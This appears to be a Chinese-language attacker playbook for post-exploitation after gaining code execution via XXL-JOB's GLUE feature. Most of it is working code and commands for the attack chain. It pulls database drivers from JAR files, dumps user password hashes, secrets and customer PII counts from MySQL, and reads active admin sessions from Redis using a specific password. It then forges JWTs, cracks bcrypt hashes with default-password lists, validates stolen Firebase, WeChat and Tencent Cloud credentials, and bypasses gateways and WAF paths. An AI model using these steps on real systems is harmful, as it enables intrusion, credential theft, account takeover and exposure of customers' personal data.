## 0. 一句话

XXL-JOB 拿到 GLUE 执行权后，**不要停在 `id/whoami`**。执行器容器通常挂着业务 JAR、能达内网 MySQL/Redis/MQ——沿着 JAR → 配置 → JDBC → Redis → JWT 一路走，10 分钟内可从"只能跑 shell"升级到"数据库全量 + 活跃 admin session"。


### 关键猎物清单

| 找什么 | yml 路径 | 价值 |

## 2. JDBC 侧向移动

### 2.1 从 JAR 提取 MySQL 驱动

```bash
cd /tmp/j
jar xf /usr/src/myapp/*.jar BOOT-INF/lib/mysql-connector-java-*.jar
ls BOOT-INF/lib/mysql-connector-java-*.jar
```

### 2.2 写 Java 查询脚本

```java
// /tmp/Q.java — 通过 XXL-JOB GLUE 注入
import java.sql.*;
public class Q {
  static void q(Connection c, String sql, String tag) throws Exception {
    try (Statement s=c.createStatement(); ResultSet r=s.executeQuery(sql)) {
      ResultSetMetaData m=r.getMetaData();
      int n=m.getColumnCount();
      while(r.next()) {
        StringBuilder sb=new StringBuilder(tag);
        for(int i=1;i<=n;i++) sb.append(" | ").append(r.getString(i));
        System.out.println(sb);
      }
    } catch(Exception e){ System.out.println(tag+" ERR "+e.getMessage()); }
  }
  public static void main(String[] a) throws Exception {
    Class.forName("com.mysql.cj.jdbc.Driver");
    try (Connection c=DriverManager.getConnection(
        "jdbc:mysql://内网IP:3306/DB?useSSL=true&allowPublicKeyRetrieval=true&serverTimezone=UTC",
        "root","密码")) {
      q(c,"SHOW DATABASES","DB");
      q(c,"SELECT UserId,UserName,Password FROM coresysuser LIMIT 20","USR");
      q(c,"SELECT ConfigKey,ConfigValue FROM coresysconfig WHERE ConfigKey LIKE '%secret%'","CFG");
    }
  }
}
```

```bash
javac /tmp/Q.java
java -cp /tmp:/tmp/j/BOOT-INF/lib/mysql-connector-java-*.jar Q
```

### 2.3 必查表

| 表 | 查什么 | SQL |
|----|--------|-----|
| `coresysuser` / `sys_user` | 员工账号+bcrypt 哈希 | `SELECT UserId,UserName,Password,Status FROM coresysuser` |
| `coresysconfig` / `sys_config` | 所有密钥配置 | `WHERE ConfigKey LIKE '%secret%' OR ... '%token%' OR ... '%key%'` |
| `refapiconfig` | 第三方 API 密钥 | `SELECT Code,ApiUser,ApiKey,ApiToken,ApiUrl FROM refapiconfig` |
| `refencryptconfig` | 加密配置 | `SELECT Code,Config FROM refencryptconfig` |
| `crmvipmaster` | VIP 会员 PII 规模 | `SELECT COUNT(*), COUNT(DISTINCT Mobile) FROM crmvipmaster WHERE Mobile IS NOT NULL` |
| `crmfcmtoken` | FCM 推送 token | `SELECT COUNT(*) FROM crmfcmtoken` |
| `crmmemberbalancetotal` | 余额规模 | `SELECT SUM(AvailableBalance) FROM crmmemberbalancetotal` |

## 3. Redis Session 劫持

### 3.1 从执行器连 Redis

```java
// 纯 Socket（不依赖 Jedis 库）
Socket sock = new Socket("Redis_IP", 6379);
// AUTH password → SELECT db → KEYS login_tokens:* → GET <key>
```

**关键：RuoYi 系默认用 db1，不是 db0。必须先 `SELECT 1`。**

### 3.2 读取活跃 session

```
AUTH UxRetail2025
SELECT 1
DBSIZE          → 确认有 key
KEYS login_tokens:*   → 活跃 JWT session UUID
GET login_tokens:<uuid>  → 完整 LoginUser JSON（含 userName、permissions、password hash）
```

### 3.3 Session 结构（RuoYi）

```json
{
  "@type": "com.uxsoft.core.common.core.domain.model.LoginUser",
  "token": "uuid-session-key",
  "permissions": ["*:*:*"],
  "user": {
    "admin": true,
    "userName": "admin",
    "googleSecret": "TOTP_BASE32_SECRET"
  }
}
```

## 4. JWT 伪造

### 4.1 签名

```python
import jwt
SECRET = "从application.yml提取的secret"
uuid = "从Redis读到的活跃admin session UUID"
token = jwt.encode({"login_user_key": uuid}, SECRET, algorithm="HS512")
```

### 4.2 使用

```
Authorization: Bearer <forged_token>
GET /prod-api/getInfo
```

**注意**：如果外网有 Nginx/WAF 额外校验（来源 IP、header 签名），伪造的 JWT 可能只能在内网使用。从 XXL-JOB 容器内 curl 内网应用 IP 绕过。

## 5. bcrypt 批量碰撞

发现多账号共享同一 bcrypt 哈希时：

```python
import bcrypt
HASH = b"$2a$10$BcJACpYblGcbaAR1bIO3he9/MnL0U8PU4EnBcN4TdcqrVokrNHmyK"
for pwd in ["123456","admin321","admin123","password","admin","Aa123456","abc123","1234567890"]:
    if bcrypt.checkpw(pwd.encode(), HASH):
        print(f"CRACKED → {pwd}")
        break
```

常见默认密码优先级：`123456` > `admin321` > `admin123` > `password` > `admin`

## 7. 云凭据验活三板斧

### 7.1 Firebase SA → GCP Token

```python
import jwt, requests
sa = json.load(open("firebase_sa.json"))
now = int(time.time())
signed = jwt.encode({
    "iss": sa["client_email"],
    "scope": "https://www.googleapis.com/auth/firebase https://www.googleapis.com/auth/cloud-platform",
    "aud": sa["token_uri"],
    "iat": now, "exp": now + 3600,
}, sa["private_key"], algorithm="RS256")
r = requests.post(sa["token_uri"], data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": signed})
access_token = r.json()["access_token"]
```

拿到 token 后枚举：Firestore / RTDB / GCS buckets / Cloud Functions / Firebase Auth users / Hosting

### 7.2 微信小程序 → access_token

```
GET https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=APPID&secret=SECRET
```

验活后调 `getaccountbasicinfo`（主体信息）、`getcategory`（分类）。

### 7.3 腾讯云 AK/SK → TC3-HMAC-SHA256

签名调 `DescribeSmsSignList`（SMS）或 `DescribeInstances`（CVM）验活。注意加 `X-TC-Region` header。

## 8. 失败处理

| 情况 | 应对 |
|------|------|
| JAR 不在默认路径 | `find / -name "*.jar" -size +5M` |
| 容器无 javac | 用 GLUE_PYTHON 写 pymysql 连接 |
| Redis 连不上 | 检查 Docker 网络段，可能需要不同 IP |
| Redis db0 为空 | **试 db1~db15**，RuoYi 常用 db1 |
| JWT 外网打不通 | 从容器内 curl 内网应用 IP（绕过网关） |
| bcrypt 常见密码不中 | 加入业务相关词（公司名、产品名、年份） |
| Druid 403 | 尝试 `;/druid/`、`..;/druid/` 路径绕过 |
